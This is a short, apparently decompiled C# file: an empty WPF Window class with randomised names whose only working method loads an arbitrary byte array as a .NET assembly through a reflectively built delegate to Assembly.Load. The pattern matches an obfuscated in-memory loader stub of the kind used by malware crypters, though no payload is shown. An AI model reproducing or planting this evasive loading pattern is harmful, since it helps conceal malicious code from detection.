using System;
using System.Reflection;
using System.Windows;
using System.Windows.Markup;

namespace cnfkt;

public class ztcye : Window, IComponentConnector
{
	internal delegate Assembly phreo(byte[] byte_0);

	public void InitializeComponent()
	{
	}

	public static Assembly AppDomainLoad(byte[] raaar)
	{
		return ((phreo)Delegate.CreateDelegate(typeof(phreo), typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }) ?? throw new InvalidOperationException()))(raaar);
	}

	private void a(int connectionId, object target)
	{
	}
}
